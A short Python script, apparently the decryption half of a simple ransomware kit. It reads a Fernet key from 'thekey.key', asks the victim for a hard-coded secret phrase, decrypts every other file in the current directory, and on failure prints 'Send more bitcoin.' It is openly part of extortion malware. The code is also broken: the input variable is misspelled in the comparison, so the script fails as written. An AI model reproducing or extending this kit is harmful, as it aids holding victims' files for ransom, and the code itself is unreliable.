#!/usr/bin/env python

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
  if file == 'ransomeware.py' or file == 'thekey.key' or file == 'decrypt.py':
    continue
  if os.path.isfile(file):
    files.append(file)

with open('thekey.key', 'rb') as key:
  secretkey = key.read()

secretpharse = 'coffee'

user_phrase = input('Enter the secret pharse to decrypt your files: \n')

if user_pharse == secretpharse:
  for file in files:
    with open(file, 'rb') as thefile:
      contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, 'wb') as thefile:
      thefile.write(contents_decrypted)
    print('congrats, you\'re files are decrypted.')

else:
  print('Sorry, wrong secret phrase. Send more bitcoin.')